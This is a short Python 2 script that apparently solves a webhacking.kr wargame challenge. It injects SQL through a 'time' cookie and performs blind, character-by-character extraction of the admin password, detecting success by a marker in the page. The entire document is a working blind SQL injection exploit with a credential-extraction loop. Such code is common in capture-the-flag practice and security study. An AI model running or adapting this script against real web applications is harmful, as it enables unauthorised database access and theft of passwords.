import re, urllib, urllib2
pw=""
my_cookie = "PHPSESSID"

print "admin password find Start"

for i in range(1, 11):
    for j in range(33,126):
        url="http://webhacking.kr/challenge/web/web-02/"
        req=urllib2.Request(url)
        req.add_header('Cookie',"time=1432644376 and (select ascii(substring(password,%d,1)) from admin)=%d; PHPSESSID=%s" %(i,j,my_cookie))
        read=urllib2.urlopen(req).read()
        find = re.findall("<!--2070-01-01 09:00:01-->",read)

        if find:
            pw=pw+chr(j)
            print "find password: " + pw
            break

print "Find password"
print "admin password is %s" %(pw)
